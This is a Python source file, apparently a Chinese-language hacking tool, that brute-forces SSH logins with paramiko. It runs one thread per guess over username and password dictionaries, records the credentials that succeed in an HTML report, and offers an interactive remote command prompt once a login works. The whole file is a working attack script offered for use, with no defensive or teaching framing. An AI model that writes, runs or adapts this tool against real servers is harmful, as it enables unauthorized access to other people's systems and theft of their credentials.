# coding = 'utf-8'
import paramiko
import optparse
import threading
import os
from selenium import webdriver
import time

class ssh_crack():
    def __init__(self):
        self.tgtHost = ''
        self.tgtPort = 22
        self.user = ''
        self.passwd = ''
        self.dic = 'example.txt'
        self.dic_u = 'u.txt'
        self.dic_p = 'pwd.txt'
        self.result = {}
        self.lock = threading.Semaphore(1)
        self.log = []

    def getcmd(self):
        # 设置命令行指令
        parser = optparse.OptionParser('usage %prog -H <target host> -P <target port>')
        # 添加命令行参数
        parser.add_option('-H', dest='tgtHost', type='string', help='specify target host,like:192.168.0.1')
        parser.add_option('-P', dest='tgtPort', type='int', help='specify target port,like:22')
        parser.add_option('-d', dest='dic', type='string', help='specify target dic with usernames and passwds,like:example.txt')
        parser.add_option('--du', dest='dic_u', type='string',help='specify target dic with usernames,like:u.txt')
        parser.add_option('--dp', dest='dic_p', type='string', help='specify target dic with passwds,like:pwd.txt')
        parser.add_option('-u', dest='user', type='string', help='specify target user,like:root')
        parser.add_option('-p', dest='passwd', type='string', help='specify target passwd,like:123456')
        # 获取参数
        (options, args) = parser.parse_args()
        self.tgtHost = options.tgtHost
        self.tgtPort = options.tgtPort
        self.dic = options.dic
        self.dic_u = options.dic_u
        self.dic_p = options.dic_p
        self.user = options.user
        self.passwd = options.passwd

        if self.tgtHost != None:
            if self.tgtPort == None:
                self.tgtPort = 22
            else:
                pass
            if self.dic != None:
                self.crack_onedic()
            else:
                if self.user == None:
                    if self.dic_u == None or self.dic_p == None:
                        print('请指定爆破字典!\n-d <usersandpwds.txt>\n-u <username> --dp <pwds.txt>\n--du <users.txt> --dp <pwds.txt>')
                        exit(0)
                    else:
                        self.crack_twodic()
                else:
                    if self.passwd == None and self.dic_p == None:
                        print('缺少参数!\n爆破请指定密码字典：--dp <pwds.txt>')
                        print('登录请指定密码：-p <passwd>')
                        exit(0)
                    elif self.passwd != None and self.dic_p == None:
                        self.connect(self.user, self.passwd)
                    elif self.passwd == None and self.dic_p != None:
                        self.crack_pwddic()
                    else:
                        print('未知命令!请检查!')
                        exit(0)
        else:
            print('未知命令!请检查!')
            exit(0)

    def connect(self, user, passwd):
        # 创建SSH对象
        ssh = paramiko.SSHClient()
        # 把要连接的机器添加到known_hosts文件中
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 连接服务器
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=self.tgtHost, port=self.tgtPort, username=user, password=passwd, timeout=10)
            print('连接成功!\n退出请输入break!')
            # 发送命令
            while(True):
                cmd = input('#'+user+':')
                if cmd == 'break':
                    ssh.close()
                    return
                # cmd = 'ls -l;ifconfig'       #多个命令用;隔开
                stdin, stdout, stderr = ssh.exec_command(cmd)
                result = stdout.read()
                if not result:
                    result = stderr.read()
                print(result.decode())
        except:
            print('Wrong username or passwd!')
            os.system("pause")

    def connect_crack(self,user,passwd):
        # 创建SSH对象
        ssh = paramiko.SSHClient()
        # 把要连接的机器添加到known_hosts文件中
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 连接服务器
        try:
            ssh.connect(hostname=self.tgtHost, port=self.tgtPort, username=user, password=passwd,timeout=10)
            ssh.close()
            self.lock.acquire()
            self.result[user] = passwd
            self.lock.release()
        except paramiko.AuthenticationException:
            self.log.append('{}:{}:{}:Failed'.format(self.tgtHost,user,passwd))
        except:
            self.log.append('{}:{}:{}:Connection Error'.format(self.tgtHost, user, passwd))

    def crack_onedic(self):
        start_time = time.time()

        try:
            # 用户名密码在一个字典里
            f = open(self.dic, 'r')
            user = f.readline().strip('\n')
            passwd = f.readline().strip('\n')
            thread_list = []
            while (user):
                # print(user,passwd)
                t = threading.Thread(target=self.connect_crack, args=(user, passwd))
                t.setDaemon(True)
                t.start()
                thread_list.append(t)
                user = f.readline().strip('\n')
                passwd = f.readline().strip('\n')
            for t in thread_list:
                t.join(timeout=5)

            print('生成HTML报告中......')
            time_spend = time.time() - start_time
            date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            convertToHtml(self.result, self.log, time_spend, date, self.tgtHost, self.tgtPort)
            print('HTML报告已存于' + os.path.dirname(os.path.realpath(__file__)) + '/' + date[
                                                                                    :10] + '_' + self.tgtHost + '.html')
        except:
            print('Cannot open ' + self.dic + '! Please check input!')

    def crack_twodic(self):
        start_time = time.time()
        try:
            # 完全爆破，用户名，密码字典分开
            f_u = open(self.dic_u, 'r')
            f_p = open(self.dic_p, 'r')
            user = f_u.readline().strip('\n')
            thread_list = []
            while (user):
                passwd = f_p.readline().strip('\n')
                while(passwd):
                    #print(user,passwd)
                    t = threading.Thread(target=self.connect_crack, args=(user, passwd))
                    t.setDaemon(True)
                    t.start()
                    thread_list.append(t)
                    passwd = f_p.readline().strip('\n')
                user = f_u.readline().strip('\n')
                f_p.seek(0)
            for t in thread_list:
                t.join(timeout=5)

            print('生成HTML报告中......')
            time_spend = time.time() - start_time
            date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            convertToHtml(self.result, self.log, time_spend, date,self.tgtHost,self.tgtPort)
            print('HTML报告已存于' + os.path.dirname(os.path.realpath(__file__)) + '/' + date[:10] + '_' + self.tgtHost + '.html')

        except:
            print('Cannot open ' + self.dic + '! Please check input!')

    def crack_pwddic(self):
        start_time = time.time()
        try:
            # 已知用户名爆破密码
            f_p = open(self.dic_p, 'r')
            user = self.user
            passwd = f_p.readline().strip('\n')
            thread_list = []
            while (passwd):
                # print(user,passwd)
                t = threading.Thread(target=self.connect_crack, args=(user, passwd))
                t.setDaemon(True)
                t.start()
                thread_list.append(t)
                passwd = f_p.readline().strip('\n')
            for t in thread_list:
                t.join(timeout=5)

            print('生成HTML报告中......')
            time_spend = time.time() - start_time
            date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            convertToHtml(self.result, self.log, time_spend, date, self.tgtHost, self.tgtPort)
            print('HTML报告已存于' + os.path.dirname(os.path.realpath(__file__)) + '/' + date[
                                                                                    :10] + '_' + self.tgtHost + '.html')
        except:
            print('Cannot open ' + self.dic + '! Please check input!')

def convertToHtml(result,errors,time_spend,date,tgtHost,tgtPort):
    head = '''<html>
    <body>
    <h1>测试报告</h1>
    '''
    end = '''</body>
    </html>'''
    f = open(date[:10]+'_'+tgtHost+".html", "w")
    f.write(head+'<br />')
    f.write(date+'<br /><br />')
    f.write('Scan Results for:' + tgtHost + ':'+ str(tgtPort) + '<br /><br />')
    for i in result:
        f.write('{} : {} : Success'.format(i,result[i]))
        f.write('<br />')
    f.write('<br />LOG<br />')
    for i in errors:
        f.write(i)
        f.write('<br />')
    f.write('<br />扫描耗时:'+str(time_spend)+'<br />')
    f.write(end)
    f.close()
    webbrowser(date,tgtHost)

def webbrowser(date,tgtHost):
    driver = webdriver.Firefox()
    #driver.implicitly_wait(5)
    driver.get("file://"+os.path.dirname(os.path.realpath(__file__))+'/'+date[:10]+'_'+tgtHost+'.html')




if __name__ == '__main__':
    ssh_instance = ssh_crack()
    ssh_instance.getcmd()
    #ssh_instance.tgtHost = '192.168.223.15'
    #ssh_instance.dic_u = '1.txt'
    #ssh_instance.dic_p = '2.txt'
    #ssh_instance.tgtPort = 22
    #ssh_instance.crack_twodic()